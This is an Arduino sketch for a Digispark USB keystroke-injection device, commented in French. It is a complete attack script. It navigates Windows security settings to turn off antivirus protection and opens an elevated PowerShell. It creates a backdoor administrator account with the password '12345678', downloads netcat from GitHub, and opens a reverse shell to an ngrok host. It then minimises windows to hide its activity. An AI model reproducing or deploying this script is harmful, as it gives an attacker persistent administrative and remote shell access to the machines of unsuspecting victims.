#include "DigiKeyboard.h"

void setup() {
  // put your setup code here, to run once:
DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT); //touche windows
DigiKeyboard.delay(500); //delais de 2 seconde
DigiKeyboard.print("protection"); // on ecrit 
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(KEY_ENTER); // appuis sur entrer
DigiKeyboard.delay(1000);
ecrire("\t",200); //tabulation
ecrire("\t",200);
ecrire("\t",200);
ecrire("\t",200);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(KEY_SPACE);
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(500);
ecrire("\t",200);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(300);
DigiKeyboard.sendKeyStroke(KEY_SPACE);
DigiKeyboard.delay(300);
ecrire("\t",200);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(300);
DigiKeyboard.sendKeyStroke(KEY_SPACE);
DigiKeyboard.delay(300);
ecrire("\t",200);
ecrire("\t",200);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(300);
DigiKeyboard.sendKeyStroke(KEY_SPACE);
DigiKeyboard.delay(300);
DigiKeyboard.sendKeyStroke(KEY_F4,MOD_ALT_LEFT);
DigiKeyboard.delay(500);
//Antivirus desactiver
DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
DigiKeyboard.delay(500);
DigiKeyboard.print("powershell");
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(500);
DigiKeyboard.print("start-process PowerShell -verb runas");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(500);
DigiKeyboard.print(F("$pass = ConvertTo-SecureString \"12345678\" -AsPlainText -Force; New-LocalUser \"user\" -Password $pass; Add-LocalGroupMember -Group \"Administrateurs\" -Member \"user\" "));
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(500);
DigiKeyboard.print("Invoke-WebRequest https://github.com/Deblpuw/netcat/raw/main/nc.exe -OutFile nc.exe");
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(500);
DigiKeyboard.print("./nc.exe -e cmd.exe 4.tcp.eu.ngrok.io 18427");
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(KEY_ENTER); 
DigiKeyboard.delay(300);
DigiKeyboard.sendKeyStroke(KEY_I,MOD_GUI_LEFT);
DigiKeyboard.delay(1000);
DigiKeyboard.print("bureau"); 
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(300);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(300);
DigiKeyboard.sendKeyStroke(KEY_SPACE);
DigiKeyboard.delay(300);
DigiKeyboard.sendKeyStroke(KEY_SPACE);
DigiKeyboard.delay(300); 
DigiKeyboard.sendKeyStroke(KEY_D,MOD_GUI_LEFT); 
 


}

void loop() {
  // put your main code here, to run repeatedly:

}

void ecrire(String chaine,int delais){
  DigiKeyboard.print(chaine);
  DigiKeyboard.delay(delais);
}